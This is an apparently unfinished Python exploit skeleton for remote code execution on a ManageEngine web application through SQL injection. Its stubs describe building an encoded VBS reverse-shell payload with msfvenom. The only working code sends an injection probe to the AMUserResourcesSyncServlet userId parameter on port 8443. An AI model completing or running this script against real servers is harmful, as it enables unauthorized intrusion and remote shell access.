"""
Author: Aleksa Zatezalo.
Date: September 2024.
Title: Managed Engine RCE.
Description: An RCE for the Manged Engine Web Application via SQL.
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Exploit creation functions
def checkDependencies():
	"""
	Checks for msfvenom in linux systems.
	"""
	pass

def checkSuperUser():
	"""
	Checks if user is super user.
	"""
	pass

def installDepencies():
	"""
	Installs system dependencies.
	"""
	pass

# String Operation Functions
def makeOneLine(file):
	"""
	Opens vbs file and returns as one line vbs string.
	"""
	pass

def encode(contents):
	"""
	Take contents of VBS file then URL encodes it after base64 encoding it.
	The duel encoded string is returned.
	"""
	pass

# Send Request Functions
def sendSQLi(rhost, rport, lhost, lport):
	"""
	Sends SQLi to rhost:rport containing a reverse shell to lhost:lport. 
	"""
	pass

# Socket Functions
def openSocket():
	pass

def reciveCommands():
	pass

def sendCommand():
	pass

# Main Functions
def main():
	if len(sys.argv) != 2:
		print("(+) usage %s <target>" % sys.argv[0])
		print ("(+) eg: %s target" % sys.argv[0])
		sys.exit(1)
	
	t = sys.argv[1]
	
	sqli = ";"

	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	print(r.text)
	print(r.headers)

if __name__ == '__main__':
	main()